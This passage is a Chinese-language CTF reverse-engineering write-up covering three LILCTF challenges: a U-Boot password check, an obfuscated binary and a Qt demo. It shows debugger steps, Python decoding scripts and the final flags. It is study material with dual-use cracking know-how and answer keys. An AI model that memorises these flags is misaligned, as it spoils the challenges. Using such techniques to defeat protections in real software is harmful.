不难发现，其中对某个 `QQQR"` 开头、长度为 `0x25` 的字符串对 `0x72` 进行了 XOR 处理。

可以对该字符串重定义类型，以便提取出来分析:

![](images/uboot-22.webp)

对该字符串对 `0x72` 进行 XOR:

![](images/uboot-23.webp)

可以发现就是要求输入密码的提示符。

不难发现该函数最后有以下字符串:

![](images/uboot-24.webp)

不难看出来所调用的函数是用于判断两个字符串是否相等的（可命名为 `strcmp`）:

![](images/uboot-25.webp)

可以 `strcmp` 传入的第一个参数 `var_84` 是在 `67f72010` 处调用的 `sub_67f71e3c` 产生的:

![](images/uboot-26.webp)

看到 `sub_67f71e3c` 函数可猜测是加密函数，可以断点到该函数调用的 `bl` 指令处:

![](images/uboot-27.webp)

可以利用 Binary Ninja 的 LLIL 看到分别对应的 `r0` 和 `r1` 寄存器，且在 `67f72010` 调用函数:

![](images/uboot-28.webp)

此时可以通过 `del` 删除之前的断点，输入 `c` 让程序继续执行，在 `0x67f72010` 处下断点，任意输入一段文本验证是否为加密函数:

此处以 `1145141919810` 作为测试:

![](images/uboot-29.webp)

看到 r0、r1 寄存器地址分别为 `0x67b1dde8` 和 `0x67b1ddb4`:

![](images/uboot-30.webp)

可以看到 r0 寄存器对应的为原文本，r1 寄存器对应的加密后的文本:

![](images/uboot-31.webp)

此时可以输入 `so` 指令查看函数执行后的结果:

![](images/uboot-32.webp)

可以看到两个传入参数的值都发生了变化，而 r1 寄存器对应的 `0x67b1ddb4` 则是加密后的结果，将会在下面进行比较。

接下来可以开始分析加密函数了。

先看到前几行代码，此处对 `r0` 赋值了一个函数对传入的第一个参数的计算值:

![](images/uboot-33.webp)

看到这个函数的定义不难看出来是计算字符串长度的（可命名为 `strlen`）:

![](images/uboot-34.webp)

随后可确定加密函数首先对传入的明文字符串进行对 `0x72` XOR 处理。

再往下看，可以看到在 `var_84` 上生成了个从 `0x30` 到 `0x6a` 的表:

![](images/uboot-35.webp)

再往下看有个 `sub_67f5fcfc` 函数调用传入了很多参数:

![](images/uboot-36.webp)

这个函数也能在刚刚找到校验密码逻辑的函数里找到，传入的第一个参数 `var_50` 在下面进行了 XOR 并输出到控制台，而第二个参数 `data_67fcb357` 对应的 XOR 加密前的字符串，而第三个参数恰好为字符串包含 NUL 字符的长度，可猜测该函数为内存复制函数（可命名为 memcpy）:

![](images/uboot-37.webp)

再看回刚刚的调用，不难看出来是将刚刚经过 XOR 加密的字符串复制到一段新空间上。

继续往下看并对变量名进行适当的调整:

![](images/uboot-38.webp)

看到中间调用的 `sub_67fc8534` 函数定义的末尾:

![](images/uboot-41.webp)

不难看出来这是编译到 ARM 目标时生成的除法函数（ARM 不支持除法）（可命名为 `div` 函数）。

而 `sub_67fc8600` 调用了 `sub_67fc8498`:

![](images/uboot-40.webp)

其调用的 `sub_67fc8498` 末尾也是跟上面的 `div` 一样特征，说明也是除法函数:

![](images/uboot-39.webp)

看回 `sub_67fc8600`，虽然反编译代码写着是直接返回的，但是结合 LLIL 和 MLIL 会发现不一样调用完之后在其他寄存器做了其他运算:

![](images/uboot-42.webp)

`r0` 对应除法结果（商），`r1` 对应传入的被除数，`r2` 对应传入的除数，不难看出来 `r1_1` (`r1` 寄存器) 存储着结果的模。

看回刚刚调用 `sub_67fc8600` 的地方，会发现并没有取 `r0` 的值，而是取的 `r1` 值，所以实际上该函数应该是除法取模函数（ARM 的 `r0` 和 `r1` 寄存器均可用于返回值，可命名为 `divmod`）:

![](images/uboot-43.webp)

再看回刚刚那段加密逻辑，将部分数字转换成十进制:

![](images/uboot-44.webp)

结合上面生成的 `0x30` 到 `0x6a` 的表，也刚好为 58 字节。

根据 `/ 58` 和 `% 58` 的特征可看出来这边是一个类 Base58 编码。

再往下看，可以看到最后将经过类 Base58 编码处理的结果写回到输出:

![](images/uboot-45.webp)

综合上面分析，可以得出加密过程为: `XOR 0x72 -> Base58-like (Table: 0x30-0x6a)`。

```python
TABLE = {b: num for num, b in enumerate(bytes(range(0x30, 0x6a)))}
RAW = b"5W2b9PbLE6SIc3WP=X6VbPI0?X@HMEWH;"

num = 0
for c in RAW:
    num = num * 58 + TABLE[c]
decoded = num.to_bytes((num.bit_length() + 7) // 8, "big")

decrypted = bytes(b ^ 0x72 for b in decoded)

print(decrypted)
```

运行脚本可解得 Flag:

![](images/uboot-46.webp)

获得 Flag 为: `LILCTF{Ub007_1s_v3ry_ez}`

### obfusheader.h

在分析之前可以运行程序进行简要观察:

![](images/obfusheader_h-2.webp)

不难看出来过长过短都会有提示，这样就可以测试出来 Flag 长度为 `40`。

由于该程序的控制流进行了混淆，所以在反编译器里看也没有什么好分析的，不过能找到链接了 `getc` 函数（没有使用 `fscanf` / `fgets` 一类函数，所以基本可以确定只调用了 `getc`）:

![](images/obfusheader_h-1.webp)

看到 `getc` 函数在 `.text` 段上地址为 `0x140033368`，对该地址进行断点:

![](images/obfusheader_h-3.webp)

随后输入 `c` 继续执行程序，输入 `40` 字符长度的 `a` 填充字符串（以便于分析）进行调试:

![](images/obfusheader_h-4.webp)

随后执行 `c 8` 让程序继续接收 8 个字符，使用 `pwndbg` 的 `search` 指令可以查找到 `getc` 后所存储的地址为 `0x14003a040`:

![](images/obfusheader_h-6.webp)

接下来可以对地址 `0x14003a040` 使用 `awatch` 指令下硬断点，随后使用 `del` 指令删除掉前面的 `getc` 断点，输入 `c` 继续调试:

![](images/obfusheader_h-7.webp)

在继续调试几次之后可以看到以下函数:

![](images/obfusheader_h-8.webp)

不难看出这边进行了异或加密，执行多几次 `c` 可以发现每次 XOR 的密钥是不一样的，但是针对于不同的输入数据所产生的 XOR 密钥是一样的（可通过输入不同数据重新调试测试出来，此处不多赘述）。

所以可以在 XOR 加密过程结束后将数据 Dump 出来对原数据 XOR 即可获得密钥。

执行多几次 `c` 等到 XOR 过程结束后，使用 `dump mem xor_filled_with_a.bin 0x14003a040 0x14003a040+40` 指令将 XOR 结果 Dump 出来:

![](images/obfusheader_h-9.webp)

随后看到上一次 `c` 出来的汇编代码:

![](images/obfusheader_h-10.webp)

以及 `c` 跳过该过程之后的数据:

![](images/obfusheader_h-11.webp)

对比前后的数据，不难发现这边是对高 4 位和低 4 位进行了互换，即:

```python
new = ((old << 4) | (old >> 4)) & 0xff
```

再看到下一个过程:

![](images/obfusheader_h-12.webp)

不难看出来这边是对数据进行执行 `not` 指令处理（即无符号算术取反，等价于 C 的 `~` 运算符）。

再跳过此过程后，可发现控制台输出了 `Encryption done, time to compare!`:

![](images/obfusheader_h-13.webp)

看到反编译函数，不难看出来 `rax` 是下标，`rcx` 和 `rdx` 是准备要进行比较的数组:

![](images/obfusheader_h-14.webp)

看到 `rcx` 为前面所断点的内存地址，可推断出 `rdx` 对应的 `0x21f411` 存储的是加密后的密文，通过指令 `dump mem encrypted.bin 0x21f411 0x21f411+40` Dump 出密文:

![](images/obfusheader_h-15.webp)

接下来可编写脚本:

```python
with open("encrypted.bin", "rb") as fp:
    encrypted = fp.read()

with open("xor_filled_with_a.bin", "rb") as fp:
    xor_filled_with_a = fp.read()

xor_key = bytes(b ^ b"a"[0] for b in xor_filled_with_a)

inverted = bytes(0xff - b for b in encrypted)  # 由于此处为无符号取反，而 Python 的 ~ 是有符号的，需要使用 `0xff -` 代替
rotated = bytes(((b >> 4) | (b << 4)) & 0xff for b in inverted)
decrypted = bytes(b ^ k for b, k in zip(rotated, xor_key))

print(decrypted)
```

运行脚本可获得 Flag:

![](images/obfusheader_h-16.webp)

得到 Flag 为: `LILCTF{whaT_iS_dATAF1#w_c@N_iT_63_E4teN}`

### Qt_Creator

直接 `7z x <FILE>` 解压出安装包文件（因为这边不是 Windows 环境安装有点麻烦（x）

使用反编译器打开 `demo_code_editor.exe` 后查看字符串可以看到几个控件名 ~~，还有个 `Ciallo`（柚子➗蒸鹅心x（是不是上面说过一次了（？））~~:

![](images/qt_creator-1.webp)

找到 `Ciallo` 所在的函数，不难看到这边对文本框的字符串取字符串 (`QLineEdit::text()`) 后进行了比较:

![](images/qt_creator-2.webp)

查看反汇编代码不难看出来这两个变量的地址分别存储在 `esi` 和 `eax` 上:

![](images/qt_creator-3.webp)

接下来可以下断点动态调试 Dump 出 Flag。

首先在 `0x00410155` 处（执行 `operator==`）下断点:

![](images/qt_creator-4.webp)

然后输入 `c` 继续执行程序，在窗口点下确定即可触发断点:

![](images/qt_creator-5.webp)

可以看到 `esi` 和 `eax` 地址所指向的地址分别为 `0x29715a8` 和 `0x68e1bac0`:

![](images/qt_creator-6.webp)

不难发现 Flag 以 UTF-16 编码存储在了 `0x29715a8` 上，此时可以扩大 `hexdump` 范围找到 Flag 实际长度，然后使用 `dump mem` 指令将 Flag Dump 出来:

![](images/qt_creator-7.webp)

![](images/qt_creator-8.webp)

打开 `flag.txt` 即可看到 Flag:

![](images/qt_creator-9.webp)

得到 Flag 为: `LILCTF{Q7_cre4t0r_1s_very_c0nv3ni3nt}`
